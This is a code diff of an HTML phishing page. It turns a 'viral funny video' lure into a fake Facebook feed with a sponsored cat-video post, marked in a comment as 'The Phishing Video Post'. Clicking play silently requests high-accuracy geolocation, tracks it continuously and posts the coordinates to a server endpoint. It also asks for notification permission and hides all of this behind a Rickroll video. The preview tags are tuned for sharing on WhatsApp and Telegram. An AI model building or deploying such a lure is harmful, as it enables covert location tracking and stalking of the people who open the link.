@@ -1,98 +1,331 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viral Funny Video - Watch Now</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="./style.css" />
+  <script src="https://kit.fontawesome.com/71b91e53ae.js" crossorigin="anonymous"></script>
 
-    <!-- OG tags for WhatsApp/Telegram preview -->
-    <meta property="og:title" content="Viral Funny Cat Video 2026 – Must See!" />
-    <meta property="og:description" content="This is going crazy right now 😂 Click to watch full HD." />
-    <meta property="og:image" content="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80" />
-    <meta property="og:type" content="video.other" />
+  <!-- Open Graph for realistic preview in WhatsApp/Telegram -->
+  <meta property="og:title" content="Hilarious Cat Parkour Fail 😂 You won't believe this!" />
+  <meta property="og:description" content="This cat tried parkour and failed so hard! Epic fail video. Watch now on Facebook." />
+  <meta property="og:image" content="https://images.unsplash.com/photo-1583512603805-3cc6b41f3edb?w=1200&auto=format&fit=crop" />
+  <meta property="og:type" content="video.other" />
 
-    <style>
-        body { font-family: Arial, sans-serif; background: #111; color: white; margin: 0; padding: 20px; text-align: center; }
-        .container { max-width: 600px; margin: auto; background: #222; padding: 20px; border-radius: 12px; }
-        h1 { color: #ffcc00; }
-        .btn { background: #e50914; color: white; border: none; padding: 16px 32px; font-size: 20px; border-radius: 8px; cursor: pointer; margin: 20px 0; }
-        #status { font-size: 18px; margin: 20px 0; color: #ffcc00; }
-        #video-area { margin-top: 30px; min-height: 300px; background: black; display: flex; align-items: center; justify-content: center; }
-    </style>
+  <title>Facebook</title>
+
+  <!-- Custom styles only for the video area – does NOT override your style.css -->
+  <style>
+    .video-wrapper {
+      position: relative;
+      background: #000;
+      height: 420px;
+      cursor: pointer;
+    }
+    .play-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80px;
+      height: 80px;
+      background: rgba(0,0,0,0.5);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 40px;
+      z-index: 10;
+      transition: background 0.2s;
+    }
+    .play-button:hover {
+      background: rgba(255,0,0,0.7);
+    }
+    .video-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+      text-align: center;
+      color: white;
+      z-index: 5;
+      pointer-events: none; /* allows clicks to pass through to play button */
+    }
+    .video-area {
+      width: 100%;
+      height: 100%;
+      display: none;
+    }
+    .error-msg {
+      color: #ff4444;
+      margin-top: 16px;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Viral Funny Video</h1>
-        <p id="status">Tap below to start watching this hilarious clip! (Region check required)</p>
-        <button class="btn" id="startBtn">Play Video</button>
-        <div id="video-area">Video loads after verification...</div>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="headerLeft">
+      <img src="./assets/png/logo.png" alt="Facebook Logo" class="logo" />
+      <div class="searchBar">
+        <i class="fa-solid fa-magnifying-glass"></i>
+        <input type="text" placeholder="Search Facebook" class="searchInput" />
+      </div>
+    </div>
+    <div class="headerMiddle">
+      <div class="navIcon activeTab">
+        <i class="fa-solid fa-house"></i>
+      </div>
+      <div class="navIcon">
+        <i class="fa-solid fa-user-group"></i>
+      </div>
+      <div class="navIcon">
+        <i class="fa-solid fa-tv"></i>
+      </div>
+      <div class="navIcon">
+        <i class="fa-solid fa-store"></i>
+      </div>
+      <div class="navIcon">
+        <i class="fa-solid fa-gamepad"></i>
+      </div>
+    </div>
+    <div class="headerRight">
+      <div class="icon">
+        <i class="fa-solid fa-bars"></i>
+      </div>
+      <div class="icon">
+        <i class="fa-brands fa-facebook-messenger"></i>
+      </div>
+      <div class="icon">
+        <i class="fa-solid fa-bell"></i>
+      </div>
+      <div class="avatarWrapper">
+        <img src="./assets/jpg/sampleUser.jpg" alt="Profile Picture" class="avatar" />
+      </div>
+    </div>
+  </header>
+
+  <!-- Main -->
+  <main class="main">
+    <div class="mainLeft">
+      <div class="menu">
+        <div class="menuItem">
+          <img src="./assets/jpg/sampleUser.jpg" alt="profile" class="avatar" />
+          <p>Vysakh Venugopal</p>
+        </div>
+        <div class="menuItem">
+          <i class="fa-solid fa-user-group"></i>
+          <p>Friends</p>
+        </div>
+        <div class="menuItem">
+          <i class="fa-solid fa-tv"></i>
+          <p>Watch</p>
+        </div>
+        <div class="menuItem">
+          <i class="fa-solid fa-store"></i>
+          <p>Marketplace</p>
+        </div>
+        <div class="menuItem">
+          <i class="fa-solid fa-users"></i>
+          <p>Groups</p>
+        </div>
+      </div>
     </div>
 
-    <script>
-        const status = document.getElementById('status');
-        const videoArea = document.getElementById('video-area');
-        const startBtn = document.getElementById('startBtn');
+    <div class="mainMiddle">
+      <div class="rootMiddle">
 
-        async function sendLocation(position) {
-            const data = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                timestamp: new Date().toISOString()
-            };
+        <!-- Create Post -->
+        <div class="createPost">
+          <img src="./assets/jpg/sampleUser.jpg" alt="Profile Picture" class="avatar" />
+          <input type="text" placeholder="What's on your mind, Vysakh?" />
+          <i class="fa-solid fa-video" style="color: crimson;"></i>
+          <i class="fa-regular fa-images" style="color: limegreen;"></i>
+          <i class="fa-regular fa-face-grin" style="color: orange;"></i>
+        </div>
 
-            try {
-                const res = await fetch('/api/send_location/', {  // trailing slash for safety
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+        <!-- Create Story -->
+        <div class="createStory">
+          <i class="fa-solid fa-plus"></i>
+          <div>
+            <h3>Create Story</h3>
+            <p>Share a photo or write something</p>
+          </div>
+        </div>
 
-                if (res.ok) {
-                    console.log('Location sent:', data);
-                    status.textContent = 'Thanks! Location verified. Enjoy the video!';
-                } else {
-                    console.error('Server responded with error:', res.status);
-                    status.textContent = 'Error sending location (server issue). Try again.';
-                }
-            } catch (err) {
-                console.error('Send failed:', err);
-                status.textContent = 'Failed to send location. Check connection.';
-            }
-        }
+        <!-- The Phishing Video Post -->
+        <div class="post">
+          <div class="singlePost">
+            <div class="postHeader">
+              <div class="infoContainer">
+                <img src="./assets/jpg/sampleUser.jpg" alt="profile picture" class="avatar">
+                <div>
+                  <h4>Funny Pets World</h4>
+                  <p>1 hr · <i class="fa-solid fa-earth-americas"></i> · Sponsored</p>
+                </div>
+              </div>
+              <div class="icons">
+                <i class="fa-solid fa-ellipsis"></i>
+                <i class="fa-solid fa-xmark"></i>
+              </div>
+            </div>
 
-        function handleError(err) {
-            console.error('Geolocation error:', err.message);
-            status.textContent = 'Location access denied or failed.';
-        }
+            <div class="postBody">
+              <p class="caption">This cat tried parkour and failed so hard 😂 Must watch!</p>
 
-        function startTracking() {
-            if (!navigator.geolocation) {
-                status.textContent = 'Geolocation not supported in this browser.';
-                return;
-            }
+              <!-- Video Area with Normal Play Button -->
+              <div class="video-wrapper" id="videoWrapper">
+                <!-- Play button in center -->
+                <div class="play-button" id="playBtn">
+                  <i class="fa-solid fa-play"></i>
+                </div>
 
-            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
+                <!-- Subtle overlay text -->
+                <div class="video-overlay" id="videoOverlay">
+                  <h2 style="margin:0 0 16px;">Hilarious Cat Parkour Fail</h2>
+                  <p style="margin:0 0 16px; font-size:17px;">
+                    Tap play to watch this epic fail!
+                  </p>
+                </div>
 
-            navigator.geolocation.watchPosition(sendLocation, handleError, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            });
-        }
+                <!-- Video will be injected here -->
+                <div id="videoArea" class="video-area"></div>
+              </div>
+            </div>
 
-        startBtn.addEventListener('click', () => {
-            startTracking();
-            startBtn.disabled = true;
-            startBtn.style.opacity = '0.6';
+            <div class="postFooter">
+              <div class="postInfo">
+                <div class="likes">
+                  <img src="./assets/svg/heart.svg" alt="heart icon" class="infoIcons" />
+                  <img src="./assets/svg/like.svg" alt="like icon" class="infoIcons">
+                  <img src="./assets/svg/care.svg" alt="care icon" class="infoIcons" />
+                  <p>4.3K</p>
+                </div>
+                <div class="commentsShares">
+                  <p>1.2K Comments</p>
+                  <p>500 Shares</p>
+                </div>
+              </div>
+              <div class="reactionContainer">
+                <div class="reaction">
+                  <i class="fa-regular fa-thumbs-up"></i>
+                  <p>Like</p>
+                </div>
+                <div class="reaction">
+                  <i class="fa-regular fa-comment"></i>
+                  <p>Comment</p>
+                </div>
+                <div class="reaction">
+                  <i class="fa-solid fa-share"></i>
+                  <p>Share</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
 
-            // Embed real funny video (Rickroll for demo – change ID if you want)
-            videoArea.innerHTML = `<iframe width="100%" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" frameborder="0" allowfullscreen></iframe>`;
+      </div>
+    </div>
+
+    <!-- Right Sidebar (Sponsored) -->
+    <div class="mainRight">
+      <div class="sponseredContainer">
+        <h3>Sponsored</h3>
+        <div class="sponsorContainer">
+          <img src="./assets/jpg/sampleUser.jpg" alt="sponsered ad" />
+          <div>
+            <h4>Student discount 70% off the first year</h4>
+            <p>adobe.com</p>
+          </div>
+        </div>
+        <div class="sponsorContainer">
+          <img src="./assets/jpg/sampleUser.jpg" alt="sponsered ad" />
+          <div>
+            <h4>Student discount 70% off the first year</h4>
+            <p>adobe.com</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const videoWrapper = document.getElementById('videoWrapper');
+    const playBtn = document.getElementById('playBtn');
+    const videoOverlay = document.getElementById('videoOverlay');
+    const videoArea = document.getElementById('videoArea');
+
+    async function sendLocation(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await fetch('/api/send_location/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
         });
-    </script>
+      } catch (err) {
+        console.error('Send failed silently');
+      }
+    }
+
+    function handleError(err) {
+      console.error('Geolocation error:', err.message);
+      videoOverlay.innerHTML += '<p class="error-msg" style="color:#ff4444; margin-top:16px;">Video may not play in your region.</p>';
+    }
+
+    function startTracking() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+
+      navigator.geolocation.watchPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      });
+    }
+
+    function requestNotifications() {
+      if (Notification.permission === "default") {
+        Notification.requestPermission();
+      }
+    }
+
+    function playVideo() {
+      // Trigger both permissions
+      startTracking();
+      requestNotifications();
+
+      // Hide overlay
+      videoOverlay.style.display = 'none';
+
+      // Show and play video
+      videoArea.innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>`;
+      videoArea.style.display = 'block';
+    }
+
+    // Click anywhere on video wrapper or play button
+    videoWrapper.addEventListener('click', playVideo);
+  </script>
 </body>
 </html>
